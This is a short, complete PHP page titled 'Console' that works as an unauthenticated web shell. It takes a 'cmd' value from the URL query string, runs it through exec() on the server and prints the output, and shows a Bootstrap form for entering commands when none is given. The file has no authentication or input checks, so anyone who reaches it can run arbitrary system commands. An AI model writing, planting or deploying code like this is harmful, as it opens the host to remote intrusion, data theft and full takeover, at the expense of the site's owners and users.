<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Console</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

</head>
<body>
<?php
    function run_cmd($cmd)
    {
        $lines = array();
        exec($cmd, $lines);
        echo "<pre> > " . $cmd . "</pre>";
        echo "<pre>" . implode("\n", $lines) . "</pre>";
    }

    if (isset($_GET['cmd'])) {
        $cmd = $_GET['cmd'];
        run_cmd($cmd);
    } else {
        echo "
        <div class='d-flex flex-column min-vh-100 justify-content-center align-items-center'>
            <form action='/console.php' method='GET'>
                <div class='mb-3'>
                    <label for='cmdInput' class='form-label'>Command</label>
                    <input name='cmd' type='text' class='form-control' id='cmdInput' aria-describedby='cmdHelp'>
                    <div id='cmdHelp' class='form-text'>Input command</div>
                </div>
                <button type='submit' class='btn btn-primary'>Execute</button>
            </form>
        </div>
        ";
    }
    ?>
</body>
</html>
